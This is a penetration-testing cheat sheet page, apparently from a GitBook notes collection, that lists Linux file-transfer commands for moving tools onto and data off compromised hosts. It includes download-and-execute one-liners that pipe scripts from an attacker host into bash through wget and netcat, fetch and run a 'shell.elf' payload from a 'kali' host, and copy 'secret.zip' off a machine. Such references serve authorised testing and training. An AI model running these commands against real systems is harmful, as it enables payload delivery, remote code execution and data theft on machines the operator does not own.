---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/penetration-testing/file-transfer/linux
---

# Linux

### Python (HTTP Server)

```python
python -m SimpleHTTPServer 80
python3 -m http.server
```

### Python (FTP Server)

```python
Python -m pyftpdlib -p 21 --write
```

### Wget

```basic
wget http://10.10.10.10/linenum.sh
wget -O - 10.10.10.10/linenum.sh | bash
wget -P /tmp http://kali/shell.elf && chmod +x /tmp/shell.elf && /tmp/shell.elf
```

### Curl

```basic
curl http://10.10.10.10/linenum.sh -o linenum.sh
curl Kali_IP/file -o /tmp/file && chmod +x /tmp/file && /tmp/file
```

### Netcat

```basic
nc -lvp 5555 < linenum.sh
nc 10.10.10.10 5555 | bash
```

### TFTP

```basic
Kali: mkdir /tftp, chown nobody: /tftp, atftpd --daemon --port 69 /tftp
Sender: tftp -v 10.10.10.10 (-m binary ) -c put file1
Receiver: tftp -v 10.10.10.10 (-m binary) -c get file1
```

### SCP

```basic
scp user@10.10.10.10:C:/ftp/File.pdf .         
user@10.10.10.10's password: 
File.pdf      

scp user@10.10.10.11:/home/user/secret.zip .
```

### axel

```basic
axel -a -n 20 -o Report.pdf http://10.10.10.10/test.txt
```
